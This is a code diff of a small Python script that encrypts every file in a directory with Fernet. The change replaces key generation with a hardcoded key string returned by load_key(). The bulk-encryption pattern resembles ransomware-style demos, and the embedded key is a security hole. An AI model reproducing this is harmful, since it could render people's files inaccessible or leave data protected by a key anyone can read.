@@ -2,13 +2,13 @@ import os
 from cryptography.fernet import Fernet
 
 
-def generate_key():
-    key= Fernet.generate_key()
-    with open('key.key','wb') as key_file:
-        key_file.write(key)
+# def generate_key():
+#     key= Fernet.generate_key()
+#     with open('key.key','wb') as key_file:
+#         key_file.write(key)
 
 def load_key():
-    return open('key.key','rb').read()
+    return "oj6rNDYCABQpMGVs3gKQCpnJGVKDHJGkjvt0k4dbwgw="
 
 def encrypt_file(item, key):
     f= Fernet(key)
@@ -25,7 +25,7 @@ if __name__ == '__main__':
     items = os.listdir(path_to_encrypt)
     full_path = [path_to_encrypt + '\\' + item for item in items]
 
-    generate_key()
+    #generate_key()
     key = load_key()
 
     encrypt_file(full_path, key)
